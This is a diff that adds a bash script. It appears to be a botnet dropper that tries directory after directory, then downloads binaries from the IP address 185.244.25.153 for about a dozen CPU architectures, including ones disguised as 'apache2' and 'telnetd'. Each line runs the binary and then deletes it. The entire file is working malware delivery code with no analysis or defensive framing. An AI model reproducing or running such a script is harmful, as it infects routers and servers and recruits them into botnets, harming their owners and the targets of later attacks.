@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.mips; curl -O http://185.244.25.153/DEMON.mips; chmod +x DEMON.mips; ./DEMON.mips; rm -rf DEMON.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.mipsel; curl -O http://185.244.25.153/DEMON.mipsel; chmod +x DEMON.mipsel; ./DEMON.mipsel; rm -rf DEMON.mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.sh4; curl -O http://185.244.25.153/DEMON.sh4; chmod +x DEMON.sh4; ./DEMON.sh4; rm -rf DEMON.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.x86; curl -O http://185.244.25.153/DEMON.x86; chmod +x DEMON.x86; ./DEMON.x86; rm -rf DEMON.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.arm6; curl -O http://185.244.25.153/DEMON.arm6; chmod +x DEMON.arm6; ./DEMON.arm6; rm -rf DEMON.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.arm5; curl -O http://185.244.25.153/DEMON.arm5; chmod +x DEMON.arm5; ./DEMON.arm5; rm -rf DEMON.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.ppc; curl -O http://185.244.25.153/DEMON.ppc; chmod +x DEMON.ppc; ./DEMON.ppc; rm -rf DEMON.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.arm4; curl -O http://185.244.25.153/DEMON.arm4; chmod +x DEMON.arm4; ./DEMON.arm4; rm -rf DEMON.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.m68k; curl -O http://185.244.25.153/DEMON.m68k; chmod +x DEMON.m68k; ./DEMON.m68k; rm -rf DEMON.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.arm; curl -O http://185.244.25.153/DEMON.arm; chmod +x DEMON.arm; ./DEMON.arm; rm -rf DEMON.arm
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/DEMON.arm7; curl -O http://185.244.25.153/DEMON.arm7; chmod +x DEMON.arm7; ./DEMON.arm7; rm -rf DEMON.arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/apache2; curl -O http://185.244.25.153/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/telnetd; curl -O http://185.244.25.153/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
